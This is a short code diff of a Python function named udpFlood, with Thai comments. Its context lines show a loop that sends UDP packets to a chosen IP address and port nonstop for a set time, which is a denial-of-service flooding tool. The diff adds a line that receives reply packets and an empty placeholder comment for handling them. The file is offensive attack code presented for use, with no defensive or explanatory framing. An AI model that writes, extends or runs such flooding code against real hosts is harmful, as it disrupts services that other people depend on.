@@ -35,7 +35,10 @@ def udpFlood():
     # ส่งแพ็กเกต UDP ให้ตลอดเวลาจนกว่าจะสิ้นสุดตามเวลาที่กำหนด
     while time.time() - start_time < dur:
         s.sendto(payload, (dest_ip, dest_port))
-    
+        data, address = s.recvfrom(1024)  # รับแพ็กเกตที่ส่งมา
+        
+        # ดำเนินการต่อกับแพ็กเกตที่ได้รับ
+        
     # แสดงข้อความเมื่อทำงานเสร็จสิ้น
     print("Done")
 
